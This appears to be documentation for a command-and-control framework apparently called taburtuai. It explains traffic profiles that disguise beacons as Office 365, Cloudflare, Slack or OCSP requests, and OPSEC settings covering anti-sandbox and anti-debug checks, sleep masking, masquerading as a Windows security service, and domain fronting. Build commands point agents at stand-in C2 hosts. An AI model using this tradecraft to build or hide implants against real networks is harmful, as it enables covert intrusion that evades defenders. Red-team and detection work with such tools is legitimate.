# C2 Profiles

Two distinct profile systems control how the agent behaves and how its traffic looks: **Malleable C2 profiles** (network traffic appearance) and **OPSEC profiles** (runtime behavior).

---

## Malleable C2 Profiles (Traffic Obfuscation)

Malleable profiles define the HTTP request/response format of every beacon. The goal is to make agent traffic indistinguishable from legitimate traffic to the same destination.

### Available Profiles

| Profile | Mimics | URI Pattern | Typical Use |
|---------|--------|-------------|-------------|
| `default` | Generic API | `/api/v1/...` | Lab/testing, no traffic concealment |
| `office365` | Exchange Web Services | `/ews/exchange.asmx/...` | Corporate Office 365 environments |
| `cdn` | Cloudflare Edge | `/cdn-cgi/...`, `/assets/...` | CDN-heavy environments |
| `jquery` | jQuery CDN | `/jquery-3.x.x.min.js`, `/libs/...` | Web-heavy environments |
| `slack` | Slack Web API | `/api/...` | Slack-using organizations |
| `ocsp` | Certificate Validation | `/ocsp/`, `/pki/...` | Environments that block unknown domains |

### What Each Profile Changes

A profile defines:
- **Checkin URI** — the path the agent uses for first contact and ECDH handshake
- **Command URI** — the path the agent polls for pending commands
- **Result URI** — the path used to submit command results
- **Beacon URI** — the combined beacon (if using combined mode)
- **Headers** — HTTP headers to include in every request (Content-Type, Accept, User-Agent pool, X-headers)
- **User-Agent pool** — list of UAs the agent randomly selects from

### Selecting a Profile at Server Start

```bash
ENCRYPTION_KEY=changeme PROFILE=office365 go run ./cmd/server
```

The server registers URI routes for the selected profile. Agents built with the same profile key connect through those URIs.

### Building an Agent for a Specific Profile

```bash
./bin/taburtuai-generate stageless \
  --server https://c2.example.com \
  --key changeme \
  --c2-profile office365 \
  --os windows \
  --arch amd64 \
  --output ./output/agent.exe
```

The profile name is baked into the agent — it knows which URI pattern to use.

## Profile Deep Dives

### office365 Profile

**Traffic looks like:** Microsoft Exchange EWS requests from Outlook.

```
POST /ews/exchange.asmx/a1b2c3d4-e5f6-7890-abcd-ef1234567890 HTTP/1.1
Host: mail.corp.com
Content-Type: text/xml; charset=utf-8
User-Agent: Microsoft Office/16.0 (Windows NT 10.0; Microsoft Outlook 16.0; en-US)
SOAPAction: "http://schemas.microsoft.com/exchange/services/2006/messages/GetItem"
Accept: text/html, application/xhtml+xml, */*

[AES-GCM ciphertext, base64-encoded]
```

**When to use:** Organizations with Office 365. EWS traffic from Outlook is expected and rarely blocked or deep-inspected. A proxy allowing `*.office365.com` will allow your beacon if you're domain-fronting through Microsoft's CDN.

### cdn Profile

**Traffic looks like:** Content delivery requests to Cloudflare's edge network.

```
GET /cdn-cgi/beacon/expect-ct HTTP/1.1
Host: cdn.cloudflare.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Accept: */*
CF-Connecting-IP: 203.0.113.1
```

**When to use:** Environments that heavily use CDN-hosted resources. Most firewalls allow CDN traffic without inspection.

### slack Profile

**Traffic looks like:** Slack API calls.

```
POST /api/conversations.history HTTP/1.1
Host: slack.com
Authorization: Bearer xoxb-...
Content-Type: application/json; charset=utf-8
User-Agent: Slackbot 1.0 (+https://api.slack.com/robots)
```

**When to use:** Organizations using Slack. Slack API traffic on port 443 is almost never blocked.

### ocsp Profile

**Traffic looks like:** Online Certificate Status Protocol requests.

```
POST /ocsp/ HTTP/1.1
Host: ocsp.pki.goog
Content-Type: application/ocsp-request
Accept: application/ocsp-response

[binary-encoded OCSP request (actually AES-GCM payload)]
```

**When to use:** Extremely paranoid environments. OCSP traffic is generated by every TLS-capable browser and application on the machine — it's nearly impossible to block without breaking TLS. This profile blends into certificate validation traffic.

## OPSEC Profiles (Runtime Behavior)

OPSEC profiles are YAML files that define how the agent behaves at runtime. They are baked in at compile time and cannot be changed without a rebuild.

### Profile Comparison Table

| Setting | default | aggressive | opsec | stealth | paranoid |
|---------|---------|-----------|-------|---------|---------|
| Beacon interval | 30s | 5s | 60s | 300s | 600s |
| Jitter | 30% | 10% | 30% | 50% | 50% |
| Working hours | off | off | off | 08:00–18:00 | 09:00–17:00 |
| Sleep masking | off | off | on | on | on |
| Anti-debug check | off | off | on | on | on |
| Anti-VM check | off | off | on | on | on |
| Anti-sandbox | off | off | on | on | on |
| Symbol stripping | off | off | recommended | on | on |
| UA rotation | off | off | on | on | on |

### Profile YAML Structure

```yaml
name: stealth
sleep_interval: 300s
jitter_percent: 50
max_retries: 3

kill_date: ""               # YYYY-MM-DD; empty = never
working_hours_only: true    # Only beacon during work hours
working_hours_start: 8      # 24-hour clock
working_hours_end: 18

sleep_masking: true         # VirtualProtect + RC4 during sleep
user_agent_rotation: true   # Pick random UA each beacon

enable_sandbox_check: true  # Detect sandboxes, abort if detected
enable_vm_check: true       # Detect VM environments
enable_debug_check: true    # Detect debuggers

exec_method: wmi            # cmd | wmi | mshta | powershell

masquerade:
  enabled: true
  company: "Microsoft Corporation"
  product: "Windows Security"
  description: "Windows Security Health Service"
  original_filename: "SecurityHealthService.exe"
  version: "10.0.19041.1"
```

### Working Hours Explained

When `working_hours_only: true`, the agent checks the target machine's local clock before each beacon cycle. If the current time is outside `working_hours_start`–`working_hours_end`, the agent sleeps for a full hour and checks again.

```
04:30 AM local time → agent sleeps, no beacon
09:00 AM local time → normal beacon cycle resumes
```

**Critical:** Test this in the same timezone as your target. A 09:00–17:00 window on a US East Coast target means no beacons overnight US time — but if you're attacking from a different timezone, ensure you account for the offset.

### Kill Date Explained

When `kill_date` is set (e.g., `"2026-05-31"`), the agent compares it against the local date at every beacon cycle. Once past the kill date, the agent calls `ExitProcess` and terminates permanently.

```bash
# Example: build agent that self-destructs after engagement
./bin/taburtuai-generate stageless \
  --kill-date 2026-05-31 \
  --server https://c2.example.com \
  --key changeme \
  --output ./output/agent.exe
```

**Why use it:**
- Limits blast radius if the binary is captured and detonated later
- Demonstrates responsible handling of engagement artifacts
- Satisfies rules of engagement requirements for time-limited testing

## Domain Fronting with Profiles

Combine a malleable profile with domain fronting for maximum concealment:

1. **Build the agent** with domain fronting and Office365 profile:
```bash
./bin/taburtuai-generate stageless \
  --server https://real-c2.example.com \
  --c2-profile office365 \
  --front-domain *.azurefd.net \
  --key changeme \
  --output ./output/agent.exe
```

2. **Network observer sees:**
   - TLS connection to `*.azurefd.net` (Microsoft Azure CDN — trusted)
   - HTTP Host: `real-c2.example.com` (invisible due to TLS)
   - URI: `/ews/exchange.asmx/agent-uuid` (looks like Exchange EWS)
   - User-Agent: Outlook 16.0

The combination of CDN routing + profile-based traffic mimicry makes the beacon essentially invisible to passive network monitoring.
